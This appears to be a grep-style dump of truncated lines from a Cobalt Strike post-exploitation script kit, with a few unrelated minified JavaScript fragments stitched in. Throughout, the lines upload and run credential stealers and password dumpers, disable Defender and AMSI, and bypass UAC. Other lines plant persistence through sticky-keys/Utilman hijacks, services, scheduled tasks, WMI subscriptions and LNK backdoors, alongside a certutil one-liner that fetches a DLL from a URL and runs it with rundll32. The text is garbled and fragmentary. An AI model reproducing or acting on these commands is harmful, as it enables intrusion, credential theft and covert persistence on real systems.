			Start-Process powershell.exe
	Set colItems = objWMIService.Exe
        Set colItems = objWMIService.Exe
    Dim oOutParams: Set oOutParams = oReg.Exe
    Set colItems = objWMIService.Exe
"					bexecute_assembly($1, script_resource(""/script/Ladon.exe"
"					bexecute_assembly($1, script_resource(""/script/SharpDoor.exe"
"					bexecute_assembly($1, script_resource(""/script/blocketw.exe"
"					bexecute_assembly($1, script_resource(""/script/dis_defender.exe"
"				$dialog = dialog(""GetSystem"", %(filepath => ""C:\\windows\\temp\\123.exe"
"				$dialog = dialog(""RegAuto"", %(name => ""test"",filepath => ""C:\\Windows\\Temp\\123.exe"
"				$dialog = dialog(""SharpHide-RegAuto"", %(filepath => ""\""C:\\Windows\\Temp\\123.exe"
"				$dialog = dialog(""bypassuac"", %(filepath => ""C:\\Windows\\Temp\\123.exe"
"				bexecute_assembly($1, script_resource('/script/BrowserGhost.exe"
"				bexecute_assembly($1, script_resource('/script/DecryptAutoLogon.exe"
"				bexecute_assembly($1, script_resource('/script/DecryptTeamViewer.exe"
"				bexecute_assembly($1, script_resource('/script/Gopher.exe"
"				bexecute_assembly($1, script_resource('/script/Ladon.exe"
"				bexecute_assembly($1, script_resource('/script/ListRDPConnections.exe"
"				bexecute_assembly($1, script_resource('/script/NoAmci.exe"
"				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe"
"				bexecute_assembly($1, script_resource('/script/SessionSearcher.exe"
"				bexecute_assembly($1, script_resource('/script/SharpDump.exe"
"				bexecute_assembly($1, script_resource('/script/SharpSpray1.exe"
"				bexecute_assembly($1, script_resource('/script/SharpWifiGrabber.exe"
"				bexecute_assembly($1, script_resource('/script/SharpXDecrypt.exe"
"				bexecute_assembly($1, script_resource('/script/SolarFlare.exe"
"				bexecute_assembly($1, script_resource('/script/StickyNotesExtract.exe"
"				bexecute_assembly($1, script_resource('/script/certexp.exe"
"				bexecute_assembly($1, script_resource('/script/napwd.exe"
"				bshell($1, ""del /f /s /q npc.exe"
"				bshell($1, ""taskkill -f /im chfs.exe"
"				bshell($1, ""taskkill -f /im crack.exe"
"				bshell($1, ""taskkill -f /im frpc.exe"
"				bshell($1, ""taskkill -f /im iox.exe"
"				bshell($1, ""taskkill -f /im lazagne.exe"
"				bshell($1, ""taskkill -f /im modify.exe"
"				bshell($1, ""taskkill -f /im npc.exe"
"				bshell($1, ""taskkill -f /im scrying.exe"
"			$dialog = dialog(""BackdoorLNK"", %(command => ""C:\\Windows\\temp\\fun.exe"
"			$dialog = dialog(""CreateService"", %(servicename => ""Debug"",command => ""C:\\Windows\\temp\\payload.exe"
"			$dialog = dialog(""SharPersist"", %(payload => ""C:\\Windows\\Temp\\payload.exe"
"			$dialog = dialog(""WMIEventSub"", %(command => ""C:\\Windows\\temp\\payload.exe"
"			bexecute_assembly($1, script_resource(""/script/Ladon.exe"
"			bexecute_assembly($1, script_resource(""/script/Ladon1.exe"
"			bexecute_assembly($1, script_resource(""/script/Net-GPPPassword.exe"
"			bexecute_assembly($1, script_resource(""/script/SPNSearcher.exe"
"			bexecute_assembly($1, script_resource(""/script/SafetyKatz.exe"
"			bexecute_assembly($1, script_resource(""/script/SharpClipHistory.exe"
"			bexecute_assembly($1, script_resource(""/script/SharpEDRChecker.exe"
"			bexecute_assembly($1, script_resource(""/script/SharpHide.exe"
"			bexecute_assembly($1, script_resource(""/script/SharpHound.exe"
"			blog($1,""Injecting into mstsc.exe"
"			bshell($bid, ""npc.exe"
"			bshell($bid, ""taskkill -f /im fscan.exe & del /f /s /q fscan.exe"
"			drow_combobox($dialog, ""filename"", ""filename:"", @(""NDP452-KB2901907-x86-x64-AllOS-ENU.exe"
"		0x00000002, ""$Env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
"		bexecute_assembly($bid, script_resource(""/script/BypassAddUser.exe"
"		bexecute_assembly($bid, script_resource(""/script/CredPhisher.exe"
"		bexecute_assembly($bid, script_resource(""/script/MaceTrap.exe"
"		bexecute_assembly($bid, script_resource(""/script/Seatbelt.exe"
"		bexecute_assembly($bid, script_resource(""/script/SharpDecryptPwd.exe"
"		bexecute_assembly($bid, script_resource(""/script/SharpDecryptPwd2.exe"
"		bexecute_assembly($bid, script_resource(""/script/SharpDir.exe"
"		bexecute_assembly($bid, script_resource(""/script/SharpExcelibur.exe"
"		bexecute_assembly($bid, script_resource(""/script/SharpExec.exe"
"		bexecute_assembly($bid, script_resource(""/script/SharpNetCheck.exe"
"		bexecute_assembly($bid, script_resource(""/script/SharpSCshell.exe"
"		bexecute_assembly($bid, script_resource(""/script/SharpSQLDump.exe"
"		bexecute_assembly($bid, script_resource(""/script/SharpSQLTools.exe"
"		bexecute_assembly($bid, script_resource(""/script/SharpXDecrypt.exe"
"		bexecute_assembly($bid, script_resource(""/script/Telemetry.exe"
"		bexecute_assembly($bid, script_resource(""/script/noNetApiAdd.exe"
"		bexecute_assembly($bid, script_resource(""/script/sharpwmi.exe"
"		bupload($bid, script_resource(""/script/x64/nc.exe"
"	$arg = join('', @(""-t schtask -c \""C:\\Windows\\System32\\cmd.exe"
"	$arg = join('', @(""-t schtaskbackdoor -c \""C:\\Windows\\System32\\cmd.exe"
"	$arg = join('', @(""-t service -c \""C:\\Windows\\System32\\cmd.exe"
"	$binary = script_resource(""/script/InternalMonologue.exe"
"	$exe = script_resource(""/script/EfsPotato.exe"
"	$exe = script_resource(""/script/SweetPotato.exe"
"	$index = indexOf($processList, ""mstsc.exe"
"	$magicstring = ""360se6\\Application\\360se.exe"
"	$program = ""c:\\windows\\system32\\werfault.exe"
"	bexecute_assembly($bid, script_resource(""/script/EncryptedZIP.exe"
"	bexecute_assembly($bid, script_resource(""/script/FakeLogonScreen.exe"
"	bexecute_assembly($bid, script_resource(""/script/Ladon.exe"
"	bexecute_assembly($bid, script_resource(""/script/Ladon1.exe"
"	bexecute_assembly($bid, script_resource(""/script/NoPowerShell.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharPersist.exe"
"	bexecute_assembly($bid, script_resource(""/script/Sharp3389.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpAVKB.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpBypassUAC.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpCheckInfo.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpCloud.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpDirLister.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpDomainSpray.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpDomainSpray/SharpDomainSpray.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpEventLog.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpGPOAbuse.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpGetTitle.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpHide.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpOXID-Find.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpShares.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpSpray.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpStay.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpTask.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpWebScan.exe"
"	bexecute_assembly($bid, script_resource(""/script/SharpZip.exe"
"	bexecute_assembly($bid, script_resource(""/script/Stealer.exe"
"	bexecute_assembly($bid, script_resource(""/script/Watson.exe"
"	bexecute_assembly($bid, script_resource(""/script/scout.exe"
"	bshell($bid, ""360bowser.exe"
"	bshell($bid, ""ATPMiniDump.exe"
"	bshell($bid, ""PrintSpoofer.exe"
"	bshell($bid, ""chfs.exe"
"	bshell($bid, ""crack.exe"
"	bshell($bid, ""frpc.exe"
"	bshell($bid, ""hack-browser-data.exe"
"	bshell($bid, ""iox.exe"
"	bshell($bid, ""lazagne.exe"
"	bshell($bid, ""scrying.exe"
"	bshell($bid, ""wmic /node:$3['ip'] /user:$3['user'] /password:$3['pass'] process call create \'cmd.exe"
"	command = ""c:\windows\system32\cmd.exe"
"	elog(""powerpick certutil.exe -urlcache -split -f "" . $url . "" Adobedll.dll; rundll32.exe"
"	prompt_text(""Copy/Paste One-liner: "", ""powerpick certutil.exe"
"            	bshell($1, ""del /f /s /q 360bowser.exe"
"            	bshell($1, ""del /f /s /q ATPMiniDump.exe"
"            	bshell($1, ""del /f /s /q chfs.exe"
"            	bshell($1, ""del /f /s /q crack.exe"
"            	bshell($1, ""del /f /s /q frpc.exe"
"            	bshell($1, ""del /f /s /q hack-browser-data.exe"
"            	bshell($1, ""del /f /s /q iox.exe"
"            	bshell($1, ""del /f /s /q lazagne.exe"
"            	bshell($1, ""del /f /s /q scrying.exe"
"                    brun($1, ""explorer.exe"
"                0x00000002, ""$Env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
"                binput(@ids,""C:\\Progra~1\\Intern~1\\iexplore.exe"
"                bshell(@ids, ""C:\\Progra~1\\Intern~1\\iexplore.exe"
"            $Dialog = dialog(""IFEO"",%(Type => ""Utilman"", CallBackFile => ""c:\\Windows\\system32\\cmd.exe"
"            0x00000002, ""C:\Windows\System32\cmd.exe"
"            bshell(@ids, ""rundll32.exe"
"            bupload($1, script_resource(""/script/lazagne.exe"
"        ""If admin, run \""SharpDPAPI -dump\"" to dump the masterkeys on the current machine from lsass.exe"
"        $Prefix = $Prefix.""Sethc.exe"
"        $Prefix = $Prefix.""Utilman.exe"
"        bshell($bid,""reg add  $+ $Reg /v Userinit /t REG_SZ /d \"" C:\\Windows\\system32\\userinit.exe"
"        bupload($bid, script_resource(""/script/360bowser.exe"
"        bupload($bid, script_resource(""/script/ATPMiniDump.exe"
"        bupload($bid, script_resource(""/script/chfs.exe"
"        bupload($bid, script_resource(""/script/crack.exe"
"        bupload($bid, script_resource(""/script/hack-browser-data.exe"
"        bupload($bid, script_resource(""/script/iox.exe"
"        bupload($bid, script_resource(""/script/scrying.exe"
"        bupload($bid, script_resource(""/script/x64/PrintSpoofer.exe"
"        bupload($bid, script_resource(""/script/x64/frpc.exe"
"        bupload($bid, script_resource(""/script/x64/fscan.exe"
"        bupload($bid, script_resource(""/script/x64/npc.exe"
"        bupload($bid, script_resource(""/script/x86/PrintSpoofer.exe"
"        bupload($bid, script_resource(""/script/x86/frpc.exe"
"        bupload($bid, script_resource(""/script/x86/fscan.exe"
"        bupload($bid, script_resource(""/script/x86/npc.exe"
"    ""Action.Path = "" &chr(34)&""c:\windows\system32\cmd.exe"
"    bexecute_assembly($bid, script_resource(""/script/Ladon.exe"
"    bexecute_assembly($bid, script_resource(""/script/SharpChassisType.exe"
"    bshell!($bid,""0803.exe"
"    bshell($bid, ""schtasks.exe"
"    bupload!($bid, script_resource(""/script/0803.exe"
" ""127.0.0.1"", user => ""administrator"", pass => ""password"", localpath => ""c:\\windows\\system32\\calc.exe"
" -urlcache -split -f "" . $url . "" Adobedll.dll; rundll32.exe"
" dialog(""Auto Run"",%(RegKey => ""HKLM"", RegItem => ""Run"", CallBackFile => ""C:\\Windows\\system32\\cmd.exe"
""",Arguments => ""/c powershell.exe"
""",lnkicon => ""C:\\Windows\\system32\\notepad.exe"
"# $SharpDPAPI::AssemblyPath = ""C:/Users/administrator/Desktop/SharpDPAPI.exe"
",user => ""TargetUser"",pass => """",domain => ""TargetDomain"",localpath => """",remotepath => ""C:\\payload.exe"
"> """",user => ""TargetUser"",pass => """",domain => ""TargetDomain"",cmdpath => ""C:\\Windows\\System32\\cmd.exe"
"ame => ""Some Service"",schtasks_description => ""Some Service"",filepath => ""C:\\Windows\\Temp\\payload.exe"
"ath => ""C:\\users\\admin\\desktop"",lnkname => ""Notepad.lnk"",lnktarget => ""C:\\Windows\\temp\\payload.exe"
"bexecute_assembly($1, script_resource('/script/SharpChromium.exe"
"bexecute_assembly($1, script_resource('/script/SharpWeb.exe"
"c(e),o=/(Mac OS X)|(Windows)|(Linux)/.exec(e);if(h=/\b(iPhone|iP[ao]d)/.exec(e),b=/\b(iP[ao]d)/.exe"
"c(e),p=/Android/i.exec(e),m=/FBAN\/\w+;/i.exec(e),g=/Mobile/i.exec(e),f=!!/Win64/.exe"
"e.replace(/\/\//g,""/"")}function k(e,t){for(var o,r=[],i=0,n=0,l="""",a=t&&t.delimiter||""/"";null!=(o=Je.exe"
"inistrator"", pass => ""password"", localpath => ""c:\\calc"", remotepath => ""c:\\windows\\system32\\calc.exe"
"loat(t[2]):NaN,n=t[3]?parseFloat(t[3]):NaN,l=t[4]?parseFloat(t[4]):NaN,l?(t=/(?:Chrome\/(\d+\.\d+))/.exe"
